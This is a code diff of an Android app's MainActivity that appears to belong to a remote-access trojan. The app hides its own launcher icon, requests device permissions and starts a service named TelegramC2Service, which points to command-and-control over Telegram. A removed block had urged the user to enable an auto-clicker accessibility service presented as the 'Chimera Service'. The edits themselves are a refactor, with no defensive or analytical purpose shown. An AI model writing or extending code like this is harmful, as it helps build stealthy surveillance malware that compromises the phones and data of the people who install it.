@@ -6,7 +6,6 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
-import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
@@ -25,29 +24,29 @@ public class MainActivity extends AppCompatActivity {
         Button btnContinue = findViewById(R.id.btnContinue);
         Button btnHide = findViewById(R.id.btnHide);
 
-        btnContinue.setOnClickListener(v -> requestPerms());
+        btnContinue.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                requestPerms();
+            }
+        });
 
-        btnHide.setOnClickListener(v -> {
-            try {
-                PackageManager pm = getPackageManager();
-                ComponentName cn = new ComponentName(MainActivity.this, MainActivity.class);
-                pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-                Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
-            } catch (Exception e) {
-                ErrorLogger.logError(MainActivity.this, "MainActivity_HideClick", e);
+        btnHide.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                try {
+                    PackageManager pm = getPackageManager();
+                    ComponentName cn = new ComponentName(MainActivity.this, MainActivity.class);
+                    pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+                    Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
+                } catch (Exception e) {
+                    ErrorLogger.logError(MainActivity.this, "MainActivity_HideClick", e);
+                }
             }
         });
     }
 
     private void requestPerms() {
-        // First, check for Accessibility permission
-        if (!AutoClickerAccessibilityService.isServiceEnabled()) {
-            Toast.makeText(this, "Please enable the Chimera Service for full functionality", Toast.LENGTH_LONG).show();
-            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            startActivity(intent);
-            return; // Wait for user to enable it
-        }
-
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 String[] perms = {
@@ -86,7 +85,6 @@ public class MainActivity extends AppCompatActivity {
     private void startTelegram() {
         try {
             startService(new Intent(this, TelegramC2Service.class));
-            // The installation message can be sent from the service itself to avoid main thread issues.
             finish();
         } catch (Exception e) {
             ErrorLogger.logError(this, "MainActivity_StartTelegram", e);
